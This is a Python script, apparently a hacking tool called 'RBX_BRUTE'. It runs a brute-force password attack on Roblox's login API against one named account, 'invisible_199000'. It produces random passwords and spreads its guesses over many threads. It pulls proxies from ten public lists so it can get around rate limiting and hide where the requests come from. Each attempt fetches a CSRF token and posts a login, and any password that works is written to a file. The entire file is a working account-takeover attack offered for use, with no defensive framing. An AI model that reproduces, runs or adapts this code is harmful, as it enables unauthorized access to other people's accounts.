import requests
import random
import string
import threading
import os
import time
import json
from colorama import Fore, init

# Initialize colorama
init()

# Colored ASCII Art
ASCII_ART = f"""
{Fore.CYAN}██████╗ {Fore.YELLOW}█████╗ {Fore.CYAN}██╗{Fore.YELLOW}   ██╗        {Fore.CYAN}██████╗ {Fore.YELLOW}█████╗ {Fore.CYAN}██╗   ██╗{Fore.YELLOW}████████╗{Fore.CYAN}███████╗
{Fore.CYAN}██╔══██╗{Fore.YELLOW}██╔══██╗{Fore.CYAN}╚██╗{Fore.YELLOW}██╔╝        {Fore.CYAN}██╔══██╗{Fore.YELLOW}██╔══██╗{Fore.CYAN}██║   ██║{Fore.YELLOW}╚══██╔══╝{Fore.CYAN}██╔════╝
{Fore.CYAN}██████╔╝{Fore.YELLOW}██████╔╝ {Fore.CYAN}╚███╔╝         {Fore.CYAN}██████╔╝{Fore.YELLOW}██████╔╝{Fore.CYAN}██║   ██║   {Fore.YELLOW}██║   {Fore.CYAN}████╗  
{Fore.CYAN}██╔══██╗{Fore.YELLOW}██╔══██╗ {Fore.CYAN}██╔██╗         {Fore.CYAN}██╔══██╗{Fore.YELLOW}██╔══██╗{Fore.CYAN}██║   ██║   {Fore.YELLOW}██║   {Fore.CYAN}██╔══╝  
{Fore.CYAN}██║  ██║{Fore.YELLOW}██████╔╝{Fore.CYAN}██╔╝ ██╗{Fore.YELLOW}███████╗{Fore.CYAN}██████╔╝{Fore.YELLOW}██║  ██║{Fore.CYAN}╚██████╔╝   {Fore.YELLOW}██║   {Fore.CYAN}███████╗
{Fore.CYAN}╚═╝  ╚═╝{Fore.YELLOW}╚═════╝ {Fore.CYAN}╚═╝  ╚═╝{Fore.YELLOW}╚══════╝{Fore.CYAN}╚═════╝ {Fore.YELLOW}╚═╝  ╚═╝ {Fore.CYAN}╚═════╝    {Fore.YELLOW}╚═╝   {Fore.CYAN}╚══════╝{Fore.RESET}
                                                                          
1. Start BruteForcing
2. Exit
"""

# Configuration
USERNAME = "invisible_199000"
PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list.txt",
    "https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
    "https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/master/proxies.txt"
]
PASSWORD_FILE = "valid_pws.txt"
PROXY_FILE = "proxies.txt"
THREADS = 10
MAX_PASSWORD_LENGTH = 12
MIN_PASSWORD_LENGTH = 6
REQUEST_TIMEOUT = 10

# Global variables
proxies = []
found = False
attempts = 0
start_time = time.time()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def generate_password():
    length = random.randint(MIN_PASSWORD_LENGTH, MAX_PASSWORD_LENGTH)
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    return ''.join(random.choice(chars) for _ in range(length))

def fetch_proxies():
    global proxies
    proxies = []
    print(f"{Fore.YELLOW}[!] Fetching proxies...{Fore.RESET}")
    
    for source in PROXY_SOURCES:
        try:
            response = requests.get(source, timeout=10)
            if response.status_code == 200:
                new_proxies = response.text.splitlines()
                proxies.extend([p.strip() for p in new_proxies if p.strip()])
                print(f"{Fore.GREEN}[+] Fetched {len(new_proxies)} proxies from {source}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[-] Error fetching from {source}: {e}{Fore.RESET}")
    
    proxies = list(set(proxies))
    print(f"{Fore.GREEN}[+] Total proxies available: {len(proxies)}{Fore.RESET}")
    
    with open(PROXY_FILE, 'w') as f:
        f.write('\n'.join(proxies))

def get_random_proxy():
    if not proxies:
        fetch_proxies()
    return random.choice(proxies) if proxies else None

def get_csrf_token(session):
    try:
        response = session.post("https://auth.roblox.com/v2/login")
        return response.headers.get("x-csrf-token")
    except:
        return None

def check_password(password):
    global found, attempts
    
    if found:
        return
    
    attempts += 1
    proxy = get_random_proxy()
    proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
    
    try:
        session = requests.Session()
        if proxy_dict:
            session.proxies.update(proxy_dict)
        
        # Get CSRF token first
        csrf_token = get_csrf_token(session)
        if not csrf_token:
            return False
        
        headers = {
            "x-csrf-token": csrf_token,
            "Content-Type": "application/json",
            "Referer": "https://www.roblox.com/"
        }
        
        login_data = {
            "ctype": "Username",
            "cvalue": USERNAME,
            "password": password
        }
        
        response = session.post(
            "https://auth.roblox.com/v2/login",
            headers=headers,
            json=login_data,
            timeout=REQUEST_TIMEOUT
        )
        
        if response.status_code == 200:
            data = response.json()
            if data.get("user") and data["user"].get("id"):
                found = True
                with open(PASSWORD_FILE, 'a') as f:
                    f.write(f"{USERNAME}:{password}\n")
                print(f"\n{Fore.GREEN}[+] SUCCESS! Valid password found: {password}{Fore.RESET}")
                print(f"{Fore.GREEN}[+] Password saved to {PASSWORD_FILE}{Fore.RESET}")
                return True
    
    except Exception as e:
        pass
    
    if attempts % 100 == 0:
        elapsed = time.time() - start_time
        rate = attempts / elapsed if elapsed > 0 else 0
        print(f"{Fore.CYAN}[*] Attempts: {attempts} | Elapsed: {elapsed:.2f}s | Rate: {rate:.2f} attempts/s{Fore.RESET}", end='\r')
    
    return False

def brute_force():
    global found
    
    print(f"{Fore.YELLOW}[!] Starting brute force attack on {USERNAME}{Fore.RESET}")
    print(f"{Fore.YELLOW}[!] Using {THREADS} threads with {len(proxies)} proxies{Fore.RESET}")
    
    if not os.path.exists(PASSWORD_FILE):
        with open(PASSWORD_FILE, 'w') as f:
            pass
    
    while not found:
        threads = []
        for _ in range(THREADS):
            if found:
                break
            password = generate_password()
            t = threading.Thread(target=check_password, args=(password,))
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()

def main():
    clear_screen()
    print(ASCII_ART)
    
    if not os.path.exists(PROXY_FILE):
        fetch_proxies()
    else:
        with open(PROXY_FILE, 'r') as f:
            global proxies
            proxies = [line.strip() for line in f.readlines() if line.strip()]
    
    while True:
        input_prompt = (
            f"{Fore.CYAN}RBX{Fore.YELLOW}_BRUTE{Fore.RESET}"
            f"@Input >> {Fore.RESET}"
        )
        choice = input(input_prompt)
        
        if choice == "1":
            brute_force()
            break
        elif choice == "2":
            print(f"{Fore.YELLOW}[!] Exiting...{Fore.RESET}")
            exit()
        else:
            print(f"{Fore.RED}[-] Invalid choice. Please enter 1 or 2.{Fore.RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[-] Process interrupted by user.{Fore.RESET}")
        exit()
